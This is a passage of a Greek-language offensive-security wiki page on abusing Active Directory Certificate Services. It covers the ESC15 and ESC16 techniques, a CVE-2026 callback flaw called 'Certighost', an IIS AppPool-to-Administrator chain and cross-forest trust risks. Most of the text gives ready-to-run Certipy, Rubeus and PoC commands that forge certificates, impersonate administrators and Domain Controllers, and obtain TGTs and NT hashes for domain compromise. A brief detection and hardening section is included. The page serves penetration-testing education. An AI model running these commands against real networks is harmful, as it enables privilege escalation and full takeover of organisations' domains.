Αποθήκευση και μετατροπή του πιστοποιητικού
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Authenticate (χρησιμοποιώντας το certificate)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Εκκαθάριση (προαιρετικό)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Για πιο συγκεκριμένες attack methods σε διάφορα attack scenarios, ανατρέξτε στο εξής: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## Πολιτικές εφαρμογών EKUwu (CVE-2024-49019) - ESC15

### Επεξήγηση

Η περιγραφή στο https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc είναι εξαιρετικά αναλυτική. Παρακάτω παρατίθεται απόσπασμα του αρχικού κειμένου.<sup>[[15]](#references)</sup>

Χρησιμοποιώντας τα ενσωματωμένα προεπιλεγμένα certificate templates έκδοσης 1, ένας attacker μπορεί να δημιουργήσει ένα CSR ώστε να περιλαμβάνει application policies που προτιμώνται έναντι των ρυθμισμένων χαρακτηριστικών Extended Key Usage που καθορίζονται στο template. Η μόνη απαίτηση είναι τα enrollment rights, και μπορεί να χρησιμοποιηθεί για τη δημιουργία client authentication, certificate request agent και codesigning certificates χρησιμοποιώντας το template **_WebServer_**

### Κατάχρηση

Η [τεκμηρίωση privilege-escalation του Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) περιέχει πιο λεπτομερή παραδείγματα χρήσης.<sup>[[14]](#references)</sup>


Η εντολή `find` του Certipy μπορεί να βοηθήσει στον εντοπισμό V1 templates που ενδέχεται να είναι ευάλωτα στο ESC15, εάν το CA δεν έχει γίνει patch.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Άμεση Impersonation μέσω Schannel

**Βήμα 1: Ζητήστε ένα certificate, εισάγοντας το Application Policy "Client Authentication" και το UPN του στόχου.** Ο attacker `attacker@corp.local` στοχεύει το `administrator@corp.local` χρησιμοποιώντας το template "WebServer" V1 (το οποίο επιτρέπει subject που παρέχεται από τον enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Το ευάλωτο V1 template με "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Εισάγει το OID `1.3.6.1.5.5.7.3.2` στο Application Policies extension του CSR.
- `-upn 'administrator@corp.local'`: Ορίζει το UPN στο SAN για impersonation.

**Βήμα 2: Authenticate μέσω Schannel (LDAPS) χρησιμοποιώντας το certificate που αποκτήθηκε.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Σενάριο B: PKINIT/Kerberos Impersonation μέσω κατάχρησης Enrollment Agent

**Βήμα 1: Ζητήστε ένα certificate από ένα V1 template (με "Enrollee supplies subject"), εισάγοντας το Application Policy "Certificate Request Agent".** Αυτό το certificate προορίζεται για τον attacker (`attacker@corp.local`), ώστε να γίνει enrollment agent. Δεν καθορίζεται UPN για την ταυτότητα του ίδιου του attacker εδώ, καθώς ο στόχος είναι η δυνατότητα χρήσης agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Βήμα 2: Χρησιμοποιήστε το πιστοποιητικό "agent" για να ζητήσετε ένα πιστοποιητικό εκ μέρους ενός προνομιούχου χρήστη-στόχου.** Πρόκειται για ένα βήμα παρόμοιο με το ESC3, χρησιμοποιώντας το πιστοποιητικό από το Βήμα 1 ως πιστοποιητικό agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Βήμα 3: Πιστοποιηθείτε ως ο προνομιούχος χρήστης χρησιμοποιώντας το πιστοποιητικό "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Η επέκταση ασφαλείας είναι απενεργοποιημένη στο CA (καθολικά)-ESC16

### Επεξήγηση

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** αναφέρεται στο σενάριο όπου, αν η ρύθμιση του AD CS δεν επιβάλλει τη συμπερίληψη της επέκτασης **szOID_NTDS_CA_SECURITY_EXT** σε όλα τα certificates, ένας attacker μπορεί να το εκμεταλλευτεί για να:

1. Ζητήσει ένα certificate **χωρίς SID binding**.

2. Χρησιμοποιήσει αυτό το certificate **για authentication ως οποιοσδήποτε account**, όπως για να impersonate έναν account με υψηλά privileges (π.χ. έναν Domain Administrator).

Μπορείτε επίσης να ανατρέξετε σε αυτό το άρθρο για να μάθετε περισσότερα σχετικά με τη λεπτομερή αρχή:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Το παρακάτω παραπέμπει σε [αυτόν τον σύνδεσμο](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), κάντε κλικ για να δείτε πιο λεπτομερείς μεθόδους χρήσης.<sup>[[14]](#references)</sup>

Για να εντοπίσετε αν το περιβάλλον Active Directory Certificate Services (AD CS) είναι ευάλωτο στο **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Βήμα 1: Ανάγνωση του αρχικού UPN του λογαριασμού-θύματος (Προαιρετικό - για επαναφορά).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Βήμα 2: Ενημερώστε το UPN του λογαριασμού-θύματος στο `sAMAccountName` του administrator-στόχου.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Βήμα 3: (Εάν χρειάζεται) Αποκτήστε διαπιστευτήρια για τον λογαριασμό «θύματος» (π.χ. μέσω Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Βήμα 4: Ζητήστε ένα certificate ως ο χρήστης-«θύμα» από _οποιοδήποτε κατάλληλο client authentication template_ (π.χ. «User») στο ESC16-vulnerable CA.** Επειδή το CA είναι ευάλωτο στο ESC16, θα παραλείψει αυτόματα το SID security extension από το certificate που εκδίδεται, ανεξάρτητα από τις συγκεκριμένες ρυθμίσεις του template για αυτή την extension. Ορίστε τη μεταβλητή περιβάλλοντος του Kerberos credential cache (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Στη συνέχεια ζητήστε το πιστοποιητικό:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Βήμα 5: Επαναφέρετε το UPN του λογαριασμού "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Βήμα 6: Πραγματοποιήστε authentication ως ο διαχειριστής-στόχος.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Επεξήγηση

Το **Certighost** κάνει abuse σε ένα **AD CS enrollment chase / callback path**, όπου η CA εμπιστεύεται attributes του request που παρέχονται από τον requester για να επιλύσει την ταυτότητα που πρέπει να τοποθετηθεί στο issued certificate. Στο public PoC, το crafted request περιλαμβάνει:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP ελεγχόμενο από τον attacker, με το οποίο θα επικοινωνήσει η CA
- **`rmd`**: το **DNS name του target Domain Controller** που θα impersonate

Αν η CA ακολουθήσει αυτό το chase, θα συνδεθεί στον attacker μέσω **SMB/LSA (`445`)** και **LDAP (`389`)**. Ο attacker χρησιμοποιεί ένα **real machine account** (συνήθως δημιουργημένο μέσω του default **`ms-DS-MachineAccountQuota`**), ώστε το callback session να κάνει authentication ως έγκυρο domain principal, αλλά οι rogue services επιστρέφουν τα identity attributes του **target DC**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Αν η CA **δεν κάνει cryptographic binding της επιστρεφόμενης identity με το authenticated callback principal**, μπορεί να εκδώσει certificate για τον **Domain Controller**, παρότι το session έκανε authentication ως το machine account που ελέγχεται από τον attacker. Αυτό διαφοροποιεί εννοιολογικά το bug από το **Certifried**: αντί να τροποποιεί AD attributes όπως το `dNSHostName`, ο attacker **αντικαθιστά identity data κατά τη διάρκεια του CA callback resolution**.<sup>[[2]](#references)</sup>

**Χρήσιμες προϋποθέσεις:**

- Low-privileged **domain credentials**
- Δυνατότητα **δημιουργίας ή επαναχρησιμοποίησης computer account**
- Network reachability από την **CA** προς τα **ports `389` και `445`** που ελέγχει ο attacker
- Vulnerable / unpatched CA request path (το **July 14, 2026** Microsoft update πρόσθεσε **DC validation για το `cdc`** και **resolved-SID comparison**)

Το resulting **`.pfx`** μπορεί στη συνέχεια να χρησιμοποιηθεί για **PKINIT**, παράγοντας ένα **`.ccache`** και, στο δημοσιευμένο PoC flow, το **target DC NT hash**, το οποίο συνήθως αρκεί για **full domain compromise**.

### Abuse

Το public PoC αυτοματοποιεί ολόκληρη την αλυσίδα:<sup>[[1]](#references)</sup>

1. Δημιουργία ή επαναχρησιμοποίηση ενός **machine account** που ελέγχεται από τον attacker.
2. Εκκίνηση **rogue LDAP και SMB/LSA listeners** στα `389` και `445`.
3. Υποβολή certificate request που περιέχει τα attacker-controlled attributes **`cdc`** και target **`rmd`**.
4. Αναμονή ώστε η CA να κάνει authentication στους rogue listeners ως το controlled machine account, ενώ απαντούν στα identity lookups με τα attributes του **target DC**.
5. Λήψη ενός CA-signed **DC certificate** και χρήση του για **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Χρήσιμα runtime flags από το PoC:

- `--listener <ip>`: επιλέγει ρητά το callback IP που διαφημίζεται στο `cdc`
- `--computer-name <NAME$>`: επαναχρησιμοποιεί έναν υπάρχοντα machine account αντί να δημιουργήσει νέο

**Operational notes:**

- Το PoC χρειάζεται **root**, επειδή κάνει bind στις **privileged ports** `389` και `445`.
- Η επιτυχής εκμετάλλευση αποθηκεύει τοπικά ένα **DC `.pfx`** και ένα **Kerberos `.ccache`**.
- Επειδή το certificate αντιστοιχίζεται σε έναν **Domain Controller account**, οι επόμενες ενέργειες μπορούν να περιλαμβάνουν **certificate-based Kerberos auth**, **DCSync** και επαναχρησιμοποίηση του ανακτημένου **machine NT hash**.<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment σε Administrator του ίδιου host

Ένα IIS pool που εκτελείται ως `ApplicationPoolIdentity` χρησιμοποιεί το **computer account** του host για outbound πρόσβαση σε network resources. Επομένως, η εκτέλεση κώδικα ως `IIS AppPool\<POOL>` παραμένει χαμηλών δικαιωμάτων στο local token, αλλά μπορεί να υποβάλει ένα AD CS request, το οποίο η CA authenticates ως `HOST$`. Πρόκειται για outbound identity transition και όχι για token impersonation ή local elevation τύπου Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Αυτή η αλυσίδα απαιτεί domain-joined IIS host, Enterprise CA προσβάσιμη μέσω RPC, δημοσιευμένο machine-authentication template για το οποίο ο computer διαθέτει enrollment rights, υποστήριξη PKINIT και KDC/SMB reachability. Ένα custom pool identity αλλάζει το outbound principal, επομένως επιβεβαιώστε ότι το pool χρησιμοποιεί πράγματι `ApplicationPoolIdentity` πριν θεωρήσετε ότι είναι `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Enrollment με attacker-controlled key

Δημιουργήστε το key pair και το CSR εκτός του IIS server και διατηρήστε το private key. Υποβάλετε **μόνο το CSR** από τον compromised worker. Το [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) κάνει instantiate το `CertificateAuthority.Request`, ορίζει `CertificateTemplate:Machine`, καλεί το `ICertRequest::Submit` και επιστρέφει το issued certificate. Χρησιμοποιήστε το CA configuration string `CAHOST\CA-NAME`. Ένα κανονικό `Machine` template δημιουργεί το subject από το AD, επομένως δεν απαιτούνται requester-supplied subject/SAN data.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Συνδυάστε το certificate που επιστράφηκε με το **αντίστοιχο διατηρημένο key**. Το `certutil -MergePFX machine_cert.cer machine_cert.pfx` λειτουργεί μόνο όταν τα Windows μπορούν ήδη να συσχετίσουν το certificate με ένα προσβάσιμο private key. Για ξεχωριστά PEM files, δημιουργήστε ρητά PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
Χρησιμοποιήστε το PFX για PKINIT και διατηρήστε το επιστρεφόμενο computer TGT ως base64 αντί να το κάνετε άμεσα inject:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self και αντικατάσταση υπηρεσίας στον ίδιο host

Το S4U2Self επιτρέπει σε μια υπηρεσία να αποκτήσει ένα ticket **προς τον εαυτό της**, το οποίο περιέχει τα authorization data ενός άλλου χρήστη. Με το computer TGT, το Rubeus μπορεί να ζητήσει αυτό το ticket για έναν privileged χρήστη, να επανεγγράψει το service name στο επιστρεφόμενο KRB-CRED σε CIFS και να το injectάρει. Αυτό είναι το τοπικό primitive “delegate to thyself”: δεν απαιτεί S4U2Proxy ούτε καταχώριση `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
Το υποκατεστημένο ticket μπορεί να χρησιμοποιηθεί μόνο από υπηρεσίες στον **ίδιο λογαριασμό/κλειδί υπολογιστή** (εδώ, CIFS στο `HOST`). Δεν είναι επαναχρησιμοποιήσιμο ticket Administrator για άλλα domain machines. Επίσης, το αποτέλεσμα που παρουσιάζεται είναι privileged πρόσβαση SMB/filesystem ως Administrator· η απόκτηση μιας διεργασίας `NT AUTHORITY\SYSTEM` εξακολουθεί να απαιτεί ξεχωριστό βήμα remote execution.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Ανίχνευση και hardening

- Στην CA, συσχετίστε τα Certification Services events **4886** (λήψη request) και **4887** (έκδοση) για μη αναμενόμενα requests του template `Machine` από λογαριασμούς IIS server.<sup>[[19]](#references)[[24]](#references)</sup>
- Στους DCs, το event **4768** περιλαμβάνει πεδία certificate όταν χρησιμοποιείται certificate pre-authentication· δημιουργήστε alert για ασυνήθιστα PKINIT TGT requests από web-server accounts. Στη συνέχεια, ελέγξτε τα **4769** requests που περιλαμβάνουν privileged impersonated identity και τον ίδιο host. Επειδή το Rubeus `/altservice` επανεγγράφει το όνομα υπηρεσίας του KRB-CRED στην πλευρά του client, μην απαιτείτε το όνομα υπηρεσίας στο DC-side 4769 να είναι `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Αναζητήστε `w3wp.exe` που συνδέεται με CA RPC endpoints, μη αναμενόμενη δημιουργία ASPX, πρόσβαση με Kerberos authentication σε administrative shares και δραστηριότητα secrets-dumping. Περιορίστε, όπου είναι δυνατόν, την πρόσβαση του app-tier σε CA RPC/KDC/SMB και αφαιρέστε τα δικαιώματα computer enrollment ή τα machine-authentication templates που δεν απαιτούνται επιχειρησιακά.<sup>[[19]](#references)</sup>

## Compromising Forests with Certificates Explained in Passive Voice

### Breaking of Forest Trusts by Compromised CAs

Η διαμόρφωση για **cross-forest enrollment** γίνεται σχετικά απλή. Το **root CA certificate** από το resource forest **δημοσιεύεται στα account forests** από administrators και τα **enterprise CA** certificates από το resource forest **προστίθενται στα `NTAuthCertificates` και AIA containers σε κάθε account forest**. Για διευκρίνιση, αυτή η διάταξη παρέχει στην **CA του resource forest πλήρη έλεγχο** σε όλα τα άλλα forests για τα οποία διαχειρίζεται PKI. Εάν αυτή η CA **παραβιαστεί από attackers**, certificates για όλους τους users τόσο στο resource όσο και στα account forests θα μπορούσαν να **πλαστογραφηθούν από αυτούς**, καταργώντας έτσι το security boundary του forest.<sup>[[6]](#references)</sup>

### Enrollment Privileges Granted to Foreign Principals

Σε multi-forest environments, απαιτείται προσοχή σχετικά με Enterprise CAs που **δημοσιεύουν certificate templates** τα οποία επιτρέπουν σε **Authenticated Users ή foreign principals** (users/groups εκτός του forest στο οποίο ανήκει η Enterprise CA) **δικαιώματα enrollment και edit**.\
Κατά το authentication μέσω trust, το **Authenticated Users SID** προστίθεται στο token του user από το AD. Επομένως, εάν ένα domain διαθέτει Enterprise CA με template που **παρέχει δικαιώματα enrollment σε Authenticated Users**, ένας user από διαφορετικό forest θα μπορούσε δυνητικά να κάνει **enrollment σε αυτό το template**. Παρομοίως, εάν **δικαιώματα enrollment παραχωρούνται ρητά σε foreign principal από ένα template**, δημιουργείται έτσι μια **cross-forest access-control relationship**, επιτρέποντας σε έναν principal από ένα forest να **κάνει enrollment σε template από άλλο forest**.

Και τα δύο σενάρια οδηγούν σε **αύξηση του attack surface** από ένα forest σε άλλο. Οι ρυθμίσεις του certificate template θα μπορούσαν να αξιοποιηθούν από attacker για την απόκτηση πρόσθετων privileges σε foreign domain.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Τεχνική ανάλυση του Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog της SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Κατάχρηση του Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, Νέες μέθοδοι Authentication και Request και άλλα](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Κατάχρηση του Key Trust Account Mapping για Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Η ιστορία του Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying στο AD Certificate Services μέσω RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access σε ADCS CA με YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Όχι απλώς ένα ακόμη AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration και Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Επανεξέταση του “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Privilege Escalation από IIS AppPool μέσω του AD CS RPC Endpoint](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Ταυτότητες Application Pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – Εντολή pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Έλεγχος Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: Ζητήθηκε Kerberos authentication ticket](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: Ζητήθηκε Kerberos service ticket](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
